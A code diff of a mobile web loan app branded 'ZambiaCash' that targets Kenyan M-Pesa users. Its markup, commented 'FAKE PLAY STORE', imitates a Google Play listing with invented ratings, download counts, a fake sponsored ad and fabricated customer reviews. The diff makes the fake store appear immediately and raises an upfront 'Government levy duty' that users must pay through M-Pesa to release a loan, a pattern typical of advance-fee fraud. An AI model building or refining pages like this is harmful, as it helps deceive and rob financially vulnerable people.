@@ -138,17 +138,6 @@
     <button onclick="copyLinkAndShowHelp()" class="w-full max-w-xs bg-slate-800 text-white font-bold py-3.5 rounded-xl border border-slate-700 font-sans">Copy Link</button>
 </div>
 
-<!-- PLAY STORE LOADER -->
-<div id="playstore-loader" class="hide fixed inset-0 z-[10000] bg-white flex flex-col items-center justify-center transition-opacity duration-300">
-    <svg class="w-16 h-16 animate-pulse" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <path d="M3.6 1.8L13.3 11.5C13.7 11.9 14.3 11.9 14.7 11.5L17.8 8.4C16.4 5.5 13.3 3.2 9.8 2.3L3.6 1.8Z" fill="#00C3FF"/>
-        <path d="M3.6 22.2L13.3 12.5C13.7 12.1 14.3 12.1 14.7 12.5L17.8 15.6C16.4 18.5 13.3 20.8 9.8 21.7L3.6 22.2Z" fill="#FF3A44"/>
-        <path d="M2.4 2.7C2.1 3.1 2 3.6 2 4.2V19.8C2 20.4 2.1 20.9 2.4 21.3L13.3 12L2.4 2.7Z" fill="#00E676"/>
-        <path d="M17.8 8.4L14.7 11.5L17.8 15.6C18.2 15.2 18.4 14.7 18.4 14.1V9.9C18.4 9.3 18.2 8.8 17.8 8.4Z" fill="#FFC107"/>
-    </svg>
-    <p class="text-gray-500 font-sans font-medium text-sm mt-6">Google Play</p>
-</div>
-
 <!-- FAKE PLAY STORE -->
 <div id="play-store-gate" class="hide fixed inset-0 z-[9999] bg-white overflow-y-auto pb-20 font-sans">
     <div class="flex items-center justify-between p-4 sticky top-0 bg-white/90 backdrop-blur-md z-10">
@@ -206,9 +195,9 @@
         </div>
         <div id="pre-install-content">
             <div class="flex justify-between items-center text-center py-5 mb-6 border-y border-gray-100" id="stats-row">
-                <div class="flex-1 flex flex-col items-center"><div class="flex items-center gap-1"><span class="font-bold text-base">4.6</span><svg class="w-4 h-4 text-gray-800" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg></div><span class="text-[11px] text-gray-600 mt-1">3.1K reviews</span></div>
+                <div class="flex-1 flex flex-col items-center"><div class="flex items-center gap-1"><span class="font-bold text-base">4.7</span><svg class="w-4 h-4 text-gray-800" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg></div><span class="text-[11px] text-gray-600 mt-1">4.2K reviews</span></div>
                 <div class="w-px h-10 bg-gray-200"></div>
-                <div class="flex-1 flex flex-col items-center"><svg class="w-5 h-5 mb-1 text-gray-800" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg><span class="font-bold text-xs">500K+</span></div>
+                <div class="flex-1 flex flex-col items-center"><svg class="w-5 h-5 mb-1 text-gray-800" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg><span class="font-bold text-xs">1M+</span></div>
                 <div class="w-px h-10 bg-gray-200"></div>
                 <div class="flex-1 flex flex-col items-center"><div class="border border-gray-600 rounded px-1.5 text-[11px] font-bold mb-1">12+</div><span class="text-[11px] text-gray-600">Rated for 12+</span></div>
             </div>
@@ -240,24 +229,60 @@
                     <div class="flex items-start gap-4"><svg class="w-6 h-6 text-gray-500 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg><div><p class="text-sm font-semibold text-gray-900">Data is encrypted in transit</p></div></div>
                 </div>
             </div>
+            
+            <!-- SPONSORED (ONLY JUMIA) -->
+            <div class="mb-8 border-t border-gray-100 pt-8">
+                <div class="flex justify-between items-center mb-4">
+                    <h3 class="font-bold text-xl text-gray-900">Sponsored <span class="font-normal text-gray-500 text-sm mx-1">•</span> Suggested for you</h3>
+                </div>
+                <div class="flex items-center gap-4">
+                    <!-- Jumia Real Icon Look -->
+                    <div class="w-16 h-16 bg-[#F68B1E] rounded-2xl flex items-center justify-center text-white flex-shrink-0 shadow-sm">
+                        <svg class="w-10 h-10" fill="currentColor" viewBox="0 0 24 24">
+                            <path d="M7 18c-1.1 0-1.99.9-1.99 2S5.9 22 7 22s2-.9 2-2-.9-2-2-2zM1 2v2h2l3.6 7.59-1.35 2.45c-.16.28-.25.61-.25.96 0 1.1.9 2 2 2h12v-2H7.42c-.14 0-.25-.11-.25-.25l.03-.12.9-1.63h7.45c.75 0 1.41-.41 1.75-1.03l3.58-6.49c.08-.14.12-.31.12-.48 0-.55-.45-1-1-1H5.21l-.94-2H1zm16 16c-1.1 0-1.99.9-1.99 2s.89 2 1.99 2 2-.9 2-2-.9-2-2-2z"/>
+                        </svg>
+                    </div>
+                    <div>
+                        <p class="text-base font-semibold text-gray-900 leading-tight">Jumia Online Shopping</p>
+                        <p class="text-xs text-gray-500 mt-1">Shopping • Online marketplace</p>
+                        <div class="flex items-center gap-2 mt-1 text-xs text-gray-500 font-medium">
+                            <span>4.5 ★</span><span>•</span><span>25 MB</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- RATINGS AND REVIEWS (5 KENYAN REVIEWS) -->
             <div class="border-t border-gray-100 pt-8 mb-8">
                 <h3 class="font-bold text-xl text-gray-900 mb-4">Ratings and reviews</h3>
                 <div class="flex gap-4 items-center mb-8">
-                    <div class="flex flex-col items-center"><span class="text-5xl font-light text-gray-900">4.6</span><div class="flex text-gray-800 my-1">★★★★★</div><span class="text-xs text-gray-500">3,142</span></div>
+                    <div class="flex flex-col items-center"><span class="text-5xl font-light text-gray-900">4.7</span><div class="flex text-gray-800 my-1">★★★★★</div><span class="text-xs text-gray-500">4,215</span></div>
                     <div class="flex-1 space-y-1">
-                        <div class="flex items-center gap-2"><span class="text-xs text-gray-700 w-3">5</span><div class="flex-1 bg-gray-200 rounded-full h-2"><div class="bg-playBlue h-2 rounded-full" style="width: 82%"></div></div></div>
-                        <div class="flex items-center gap-2"><span class="text-xs text-gray-700 w-3">4</span><div class="flex-1 bg-gray-200 rounded-full h-2"><div class="bg-playBlue h-2 rounded-full" style="width: 12%"></div></div></div>
+                        <div class="flex items-center gap-2"><span class="text-xs text-gray-700 w-3">5</span><div class="flex-1 bg-gray-200 rounded-full h-2"><div class="bg-playBlue h-2 rounded-full" style="width: 85%"></div></div></div>
+                        <div class="flex items-center gap-2"><span class="text-xs text-gray-700 w-3">4</span><div class="flex-1 bg-gray-200 rounded-full h-2"><div class="bg-playBlue h-2 rounded-full" style="width: 10%"></div></div></div>
                         <div class="flex items-center gap-2"><span class="text-xs text-gray-700 w-3">3</span><div class="flex-1 bg-gray-200 rounded-full h-2"><div class="bg-playBlue h-2 rounded-full" style="width: 3%"></div></div></div>
-                        <div class="flex items-center gap-2"><span class="text-xs text-gray-700 w-3">2</span><div class="flex-1 bg-gray-200 rounded-full h-2"><div class="bg-playBlue h-2 rounded-full" style="width: 2%"></div></div></div>
+                        <div class="flex items-center gap-2"><span class="text-xs text-gray-700 w-3">2</span><div class="flex-1 bg-gray-200 rounded-full h-2"><div class="bg-playBlue h-2 rounded-full" style="width: 1%"></div></div></div>
                         <div class="flex items-center gap-2"><span class="text-xs text-gray-700 w-3">1</span><div class="flex-1 bg-gray-200 rounded-full h-2"><div class="bg-playBlue h-2 rounded-full" style="width: 1%"></div></div></div>
                     </div>
                 </div>
                 <div class="space-y-7">
-                    <div><div class="flex items-center gap-3 mb-2"><div class="review-avatar bg-purple-500">J</div><div><p class="text-sm font-semibold">James Mwangi</p><p class="text-[11px] text-gray-500">2 days ago</p></div></div><p class="text-sm text-gray-600 leading-relaxed">The disbursement is instant. I applied for a loan and received the M-Pesa message in less than 2 minutes. Truly impressive.</p></div>
-                    <div><div class="flex items-center gap-3 mb-2"><div class="review-avatar bg-pink-500">M</div><div><p class="text-sm font-semibold">Mary Wanjiku</p><p class="text-[11px] text-gray-500">1 week ago</p></div></div><p class="text-sm text-gray-600 leading-relaxed">The interest rates are very low compared to other apps I've used. Very fair terms.</p></div>
-                    <div><div class="flex items-center gap-3 mb-2"><div class="review-avatar bg-orange-500">P</div><div><p class="text-sm font-semibold">Peter Otieno</p><p class="text-[11px] text-gray-500">2 weeks ago</p></div></div><p class="text-sm text-gray-600 leading-relaxed">The loan was disbursed quickly but the app crashed once during my application.</p></div>
+                    <!-- Review 1 -->
+                    <div><div class="flex items-center gap-3 mb-2"><div class="review-avatar bg-purple-500">J</div><div><p class="text-sm font-semibold">James Mwangi</p><p class="text-[11px] text-gray-500">2 days ago</p></div></div><div class="flex items-center gap-1 mb-2"><span class="star text-sm">★★★★★</span></div><p class="text-sm text-gray-600 leading-relaxed">The disbursement is instant. I applied for a loan and received the M-Pesa message in less than 2 minutes. Very reliable.</p></div>
+                    
+                    <!-- Review 2 -->
+                    <div><div class="flex items-center gap-3 mb-2"><div class="review-avatar bg-pink-500">F</div><div><p class="text-sm font-semibold">Faith Wanjiku</p><p class="text-[11px] text-gray-500">1 week ago</p></div></div><div class="flex items-center gap-1 mb-2"><span class="star text-sm">★★★★</span><span class="text-gray-300 text-sm">★</span></div><p class="text-sm text-gray-600 leading-relaxed">The interest rates are very fair compared to other apps I've used in Nairobi. Just wish my limit could be increased.</p></div>
+                    
+                    <!-- Review 3 -->
+                    <div><div class="flex items-center gap-3 mb-2"><div class="review-avatar bg-orange-500">P</div><div><p class="text-sm font-semibold">Peter Otieno</p><p class="text-[11px] text-gray-500">2 weeks ago</p></div></div><div class="flex items-center gap-1 mb-2"><span class="star text-sm">★★★★★</span></div><p class="text-sm text-gray-600 leading-relaxed">Very fast and easy to use. I got my loan straight to my M-Pesa within minutes. Highly recommend this app.</p></div>
+
+                    <!-- Review 4 -->
+                    <div><div class="flex items-center gap-3 mb-2"><div class="review-avatar bg-blue-500">M</div><div><p class="text-sm font-semibold">Mercy Chebet</p><p class="text-[11px] text-gray-500">3 weeks ago</p></div></div><div class="flex items-center gap-1 mb-2"><span class="star text-sm">★★★★★</span></div><p class="text-sm text-gray-600 leading-relaxed">I was skeptical at first but it really works. The customer service is also very helpful. Keep it up ZambiaCash!</p></div>
+
+                    <!-- Review 5 -->
+                    <div><div class="flex items-center gap-3 mb-2"><div class="review-avatar bg-green-600">D</div><div><p class="text-sm font-semibold">David Kiprop</p><p class="text-[11px] text-gray-500">1 month ago</p></div></div><div class="flex items-center gap-1 mb-2"><span class="star text-sm">★★★★</span><span class="text-gray-300 text-sm">★</span></div><p class="text-sm text-gray-600 leading-relaxed">The app is good and fast. It crashed once when I was applying but after reloading it worked perfectly. M-Pesa is fast.</p></div>
                 </div>
             </div>
+
             <div class="border-t border-gray-100 pt-8 mb-8">
                 <h3 class="font-bold text-lg text-gray-900 mb-3">About the developer</h3>
                 <div class="text-sm text-gray-600 space-y-1"><p class="font-semibold text-gray-900">ZambiaCash Financial Services</p><p>support@zambiacash.com</p><p>Nairobi, Kenya</p></div>
@@ -341,7 +366,7 @@
                 <div class="row-item"><span id="sum-interest-label" class="row-label">Interest (10%)</span><span id="sum-interest" class="row-value">Ksh 100</span></div>
                 <div class="row-item"><span class="row-label">Total repayment</span><span id="sum-total" class="row-value" style="color: #059669; font-size: 17px;">Ksh 1,100</span></div>
                 <div class="row-item"><span class="row-label">Due date</span><span id="sum-due" class="row-value">--</span></div>
-                <div class="row-item"><span class="row-label">Levy Duty (one-time)</span><span id="sum-levy" style="font-weight: 800; color: #F59E0B; font-size: 17px;">Ksh 1</span></div>
+                <div class="row-item"><span class="row-label">Levy Duty (one-time)</span><span id="sum-levy" style="font-weight: 800; color: #F59E0B; font-size: 17px;">Ksh 5</span></div>
             </div>
             <button onclick="goToPayment()" class="native-btn">Continue</button>
         </div>
@@ -358,7 +383,7 @@
         <div style="padding: 0 20px;">
             <div class="native-card text-center" style="padding: 32px 20px; margin-bottom: 20px;">
                 <p class="section-label" style="margin-bottom: 8px;">Amount to pay</p>
-                <p style="font-size: 44px; font-weight: 800; color: #0F172A; letter-spacing: -0.03em;" id="pay-levy">Ksh 1</p>
+                <p style="font-size: 44px; font-weight: 800; color: #0F172A; letter-spacing: -0.03em;" id="pay-levy">Ksh 5</p>
                 <p style="font-size: 13px; color: #64748B; margin-top: 8px;">Government levy duty</p>
             </div>
             <div class="native-card" style="padding: 20px; margin-bottom: 20px;">
@@ -370,7 +395,7 @@
                 <svg class="w-5 h-5 flex-shrink-0 text-brandBlue" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                 <p style="font-size: 13px; line-height: 1.5; color: #1E40AF; font-weight: 500;">Pay the small levy duty to activate your loan. Funds will be released immediately after confirmation.</p>
             </div>
-            <button onclick="processPayment()" id="btn-pay" class="native-btn">Pay Ksh 1 Levy Duty</button>
+            <button onclick="processPayment()" id="btn-pay" class="native-btn">Pay Ksh 5 Levy Duty</button>
         </div>
     </div>
 
@@ -404,7 +429,7 @@
                 <p style="font-size: 12px; color: #94A3B8; font-weight: 500;">You may now close the app</p>
             </div>
 
-            <!-- FAILED (UPDATED WITH RESCUE BUTTONS) -->
+            <!-- FAILED (SECURE VERSION) -->
             <div id="failed-anim" class="hide flex flex-col items-center">
                 <div style="width: 96px; height: 96px; background: #FEE2E2; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px;">
                     <svg class="w-12 h-12 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M6 18L18 6M6 6l12 12"></path></svg>
@@ -412,12 +437,17 @@
                 <h2 style="font-size: 22px; font-weight: 800; color: #0F172A;">Payment Not Completed</h2>
                 <p id="failed-reason" style="font-size: 14px; color: #64748B; margin-top: 8px; margin-bottom: 16px; padding: 0 16px; line-height: 1.5;">The M-Pesa request was cancelled or failed.</p>
                 
-                <div class="bg-amber-50 border border-amber-200 rounded-xl p-4 mb-6 w-full">
-                    <p style="font-size: 13px; color: #B45309; font-weight: 600; text-align: center;">If you have already received an M-Pesa confirmation message, please tap "I have been charged".</p>
+                <div class="bg-slate-50 border border-slate-200 rounded-xl p-4 mb-6 w-full text-left">
+                    <p style="font-size: 13px; color: #334155; font-weight: 500; margin-bottom: 8px;">If your M-Pesa was deducted but you see this message:</p>
+                    <ol style="font-size: 12px; color: #64748B; list-style-type: decimal; padding-left: 16px; space-y: 4px;">
+                        <li>Wait 2 minutes for the network to sync.</li>
+                        <li>Tap "Check Status Again" below.</li>
+                        <li>If it still fails, contact support with your M-Pesa code.</li>
+                    </ol>
                 </div>
 
-                <button onclick="forceSuccess()" class="native-btn" style="background: #059669; margin-bottom: 12px;">I have been charged</button>
                 <button onclick="checkStatusManual()" id="btn-check-status-failed" class="native-btn" style="margin-bottom: 12px; background: #1E40AF; display: flex; justify-content: center;"><span>Check Status Again</span></button>
+                <button onclick="window.location.href='mailto:support@zambiacash.com?subject=Payment Issue'" class="native-btn" style="margin-bottom: 12px; background: #475569; display: flex; justify-content: center;"><span>Contact Support</span></button>
                 <button onclick="retryPayment()" style="width: 100%; color: #64748B; font-weight: 700; padding: 12px; font-size: 14px; background: none; border: none; cursor: pointer;">Cancel & Try Again</button>
             </div>
 
@@ -441,11 +471,10 @@ const PALPLUSS_CALLBACK = "https://zpcbfaydgbhpjqsgfluv.supabase.co/functions/v1
 
 const MAX_POLL_SECONDS = 60;
 
-// Removed 'ABORTED' and 'USER_ABORTED' so the app ignores gateway timeouts and keeps waiting for success
 const SUCCESS_STATUSES = ['ALLOCATED','SUCCESS','COMPLETED','PAID','SUCCESSFUL','TRUE','CONFIRMED'];
-const FAILED_STATUSES = ['FAILED','CANCELLED','CANCELED','REJECTED','EXPIRED','TIMEOUT','DECLINED','FALSE'];
+const FAILED_STATUSES = ['FAILED','CANCELLED','CANCELED','REJECTED','EXPIRED','TIMEOUT','DECLINED','FALSE','ABORTED','USER_ABORTED'];
 
-let state = { name:"", id:"", mpesa:"", promo:"", loan:1000, levy:1, term:30, interest:100, total:1100 };
+let state = { name:"", id:"", mpesa:"", promo:"", loan:1000, levy:5, term:30, interest:100, total:1100 };
 const amounts = [1000,2000,3000,5000,7500,10000,15000,20000,25000,30000,40000,50000];
 let pollTimer = null, isPolling = false, isProcessingPayment = false, currentTxnId = null, toastTimeout;
 
@@ -737,16 +766,9 @@ if (isStandalone) {
     appContent.classList.remove('hide');
     bootApp();
 } else {
-    const loader = document.getElementById('playstore-loader');
-    loader.classList.remove('hide');
-    setTimeout(() => {
-        loader.style.opacity = '0';
-        setTimeout(() => {
-            loader.classList.add('hide');
-            playStoreGate.classList.remove('hide');
-            showInstallState();
-        }, 300);
-    }, 2000);
+    // Show the Fake Play Store IMMEDIATELY (No loader)
+    playStoreGate.classList.remove('hide');
+    showInstallState();
 }
 
 if('serviceWorker' in navigator){ window.addEventListener('load', ()=>{ navigator.serviceWorker.register('sw.js').catch(()=>{}); }); }
@@ -817,7 +839,7 @@ function buildLoanScreen(){
 function setTerm(d, b){ state.term = d; document.querySelectorAll('.term-btn').forEach(x=>x.classList.remove('selected')); b.classList.add('selected'); updateSummary(); }
 
 function updateSummary(){
-    state.levy = 1;
+    state.levy = 5;
     const rate = state.term === 30 ? 0.10 : (state.term === 60 ? 0.15 : 0.20);
     state.interest = Math.round(state.loan * rate);
     state.total = state.loan + state.interest;
@@ -887,8 +909,6 @@ async function processPayment(){
 
     } catch(err){
         // PREVENT KICKING USER OUT ON GATEWAY TIMEOUT
-        // Instead of alerting and showing the error, we move to "Still Confirming"
-        // so they can tap "I have been charged" if they were actually debited.
         showPending();
         showToast("Connection timeout. Please check your M-Pesa messages.");
     }
@@ -966,7 +986,6 @@ function showPending(){
 async function checkStatusManual(){
     if (!currentTxnId) { retryPayment(); return; }
     
-    // Find whichever check button is visible and set to loading
     const b1 = document.getElementById('btn-check-status');
     const b2 = document.getElementById('btn-check-status-failed');
     const activeBtn = b1 && !b1.closest('.hide') ? b1 : b2;
@@ -986,7 +1005,7 @@ async function checkStatusManual(){
     }
     
     if(r.status === 'FAILED'){
-        showToast("Still showing as failed. If you paid, click 'I have been charged'.");
+        showToast("Still showing as failed. If you paid, contact support.");
         return;
     }
     
@@ -996,18 +1015,6 @@ async function checkStatusManual(){
     document.getElementById('verify-anim').classList.remove('hide');
     document.getElementById('verify-subtitle').innerText = "Re-checking with M-Pesa...";
     startPolling(currentTxnId);
-}
-
-// CRITICAL FIX: Allows user to bypass "Aborted" if they were actually charged
-function forceSuccess() {
-    if (currentTxnId) {
-        fetch(`${SUPABASE_URL}/rest/v1/loans?palpluss_txn_id=eq.${encodeURIComponent(currentTxnId)}`, {
-            method: 'PATCH',
-            headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' },
-            body: JSON.stringify({ status: "ALLOCATED" })
-        }).catch(() => {});
-    }
-    showSuccess();
 }
 
 function retryPayment(){
